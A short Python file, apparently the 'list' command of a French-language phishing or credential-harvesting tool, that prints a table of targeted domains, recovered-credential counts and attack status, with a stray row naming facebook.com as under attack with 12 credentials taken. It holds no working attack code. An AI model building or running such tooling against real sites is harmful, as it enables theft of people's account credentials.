from tabulate import tabulate
from termcolor import colored
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from websites import WEBSITES

def list_command(params): 
    
    data = WEBSITES

    def formatted_item(row):
        return [row[0], row[1], "Activé" if row[2] == 1 else "Désactivé", row[3], colored("En cours d'attaque" if row[4] == 1 else "Arrêté", "green" if row[4] == 1 else "red")]

    websites_formatted = map(formatted_item, WEBSITES)

    headers = ["Id", "Domaine", "HTTPS", "Identifiants récupérés", "Status"]

    print(tabulate(websites_formatted, headers, tablefmt="grid"))

[1, "facebook.com", 1, 12, 1]